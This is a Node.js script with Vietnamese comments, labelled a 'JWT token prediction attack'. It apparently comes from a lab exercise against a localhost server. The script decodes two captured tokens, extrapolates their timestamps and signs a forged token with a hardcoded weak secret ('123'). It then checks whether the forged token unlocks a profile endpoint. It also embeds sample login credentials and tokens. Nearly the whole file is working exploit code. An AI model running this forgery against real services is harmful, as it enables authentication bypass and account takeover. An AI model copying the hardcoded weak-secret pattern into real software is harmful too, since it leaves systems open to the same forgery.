const axios = require('axios');
const jwt = require('jsonwebtoken');

// Sử dụng cùng JWT_SECRET với server
const JWT_SECRET = '123';

// Token được lấy từ frontend sau khi login
// CHÚ Ý: Cần thay thế bằng tokens MỚI từ việc login gần đây
const knownTokens = [
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3ZjYwNTA5ZTRlMmY4YmM5YmE4YTU1ZCIsInVzZXJuYW1lIjoidXNlcjEiLCJpYXQiOjE3NTIxMDYzNzMsImV4cCI6MTc1MjEwNjM4M30.RWyONlWpfLlCBmY2KZhFVz005jc3P4V1El11U5MSo2A',  // Token 1 - Login lần 1
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3ZjYwNTA5ZTRlMmY4YmM5YmE4YTU1ZCIsInVzZXJuYW1lIjoidXNlcjEiLCJpYXQiOjE3NTIxMDY0MTMsImV4cCI6MTc1MjEwNjQyM30.cP6M4oLn5YqaZiLlPeKDFV3Dr5iAy3OujuBT5GG7E8E'   // Token 2 - Login lần 2 (cách nhau vài giây)
];

// Hàm để tự động lấy tokens mới (cần credentials)
async function getNewTokens() {
    console.log('Attempting to get new tokens...');
    const tokens = [];
    
    // Login 2 lần để lấy 2 tokens
    for (let i = 1; i <= 2; i++) {
        try {
            const response = await axios.post('http://localhost:3000/api/login', {
                username: 'user1', // Thay đổi theo user thực tế
                password: 'password123' // Thay đổi theo password thực tế
            }, {
                withCredentials: true,
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            
            // Lấy token từ cookie hoặc response
            const token = response.data.token || 'Token not found in response';
            tokens.push(token);
            console.log(`Token ${i}:`, token);
            
            // Đợi 1-2 giây trước khi login lần tiếp theo
            if (i < 2) await new Promise(resolve => setTimeout(resolve, 2000));
            
        } catch (error) {
            console.error(`Failed to get token ${i}:`, error.response?.data || error.message);
        }
    }
    
    return tokens;
}

// Hàm để phân tích token và tìm quy luật
function analyzeTokens(token1, token2) {
    const payload1 = jwt.decode(token1);
    const payload2 = jwt.decode(token2);

    console.log('Token 1 payload:', payload1);
    console.log('Token 2 payload:', payload2);

    // Tìm quy luật tăng thời gian
    const iatDiff = payload2.iat - payload1.iat;
    const expDiff = payload2.exp - payload1.exp;

    console.log('Quy luật tăng thời gian:');
    console.log('iatDiff:', iatDiff, 'seconds');
    console.log('expDiff:', expDiff, 'seconds');

    return {
        payload1,
        payload2,
        iatDiff,
        expDiff
    };
}

// Hàm để tạo token mới dựa trên quy luật
function createPredictedToken(analysis) {
    const { payload2, iatDiff, expDiff } = analysis;

    const predictedPayload = {
        id: payload2.id,
        username: payload2.username,
        iat: payload2.iat + iatDiff,
        exp: payload2.exp + expDiff
    };

    // Tạo token không dùng thời gian hiện tại
    const newToken = jwt.sign(predictedPayload, JWT_SECRET);
    console.log('New token:', newToken);
    return newToken;
}


// Hàm để kiểm tra token mới
async function testToken(token) {
    try {
        const response = await axios.get('http://localhost:3000/api/profile', {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        });
        console.log('Token mới hoạt động!');
        console.log('Response:', response.data);
        return true;
    } catch (error) {
        console.log('Token mới không hoạt động:', error.message);
        return false;
    }
}

// Hàm chính để thực hiện tấn công
async function performAttack() {
    console.log('Bắt đầu tấn công JWT token prediction...\n');

    // Kiểm tra xem có cần lấy tokens mới không
    if (knownTokens[0] === 'REPLACE_WITH_NEW_TOKEN_1' || knownTokens[1] === 'REPLACE_WITH_NEW_TOKEN_2') {
        console.log(' Cần lấy tokens mới trước! Đang thử tự động lấy...\n');
        const newTokens = await getNewTokens();
        
        if (newTokens.length >= 2) {
            console.log('Đã lấy được tokens mới! Đang phân tích...\n');
            const analysis = analyzeTokens(newTokens[0], newTokens[1]);
            const predictedToken = createPredictedToken(analysis);
            await testToken(predictedToken);
        } else {
            console.log('Không thể lấy được đủ tokens. Vui lòng:');
            console.log('1. Đảm bảo server đang chạy');
            console.log('2. Tạo user với username/password phù hợp');
            console.log('3. Hoặc thay thế tokens trong knownTokens[] bằng tokens thực tế\n');
        }
        return;
    }

    // Phân tích token và tìm quy luật
    console.log(' Phân tích tokens hiện có...\n');
    const analysis = analyzeTokens(knownTokens[0], knownTokens[1]);

    // Tạo token mới dựa trên quy luật  
    console.log('\n Tạo token dự đoán...\n');
    const predictedToken = createPredictedToken(analysis);

    // Kiểm tra token mới
    console.log('\n Kiểm tra token dự đoán...\n');
    await testToken(predictedToken);
}

// Thêm hàm helper để decode và hiển thị token
function inspectToken(token, label) {
    console.log(`\n ${label}:`);
    console.log('Token:', token);
    try {
        const decoded = jwt.decode(token);
        console.log('Payload:', decoded);
        console.log('Issued at:', new Date(decoded.iat * 1000));
        console.log('Expires at:', new Date(decoded.exp * 1000));
        console.log('Time to live:', decoded.exp - decoded.iat, 'seconds');
    } catch (err) {
        console.log(' Cannot decode token:', err.message);
    }
}

// Chạy tấn công
console.log('='.repeat(60));
console.log(' JWT TOKEN PREDICTION ATTACK');
console.log('='.repeat(60));
performAttack();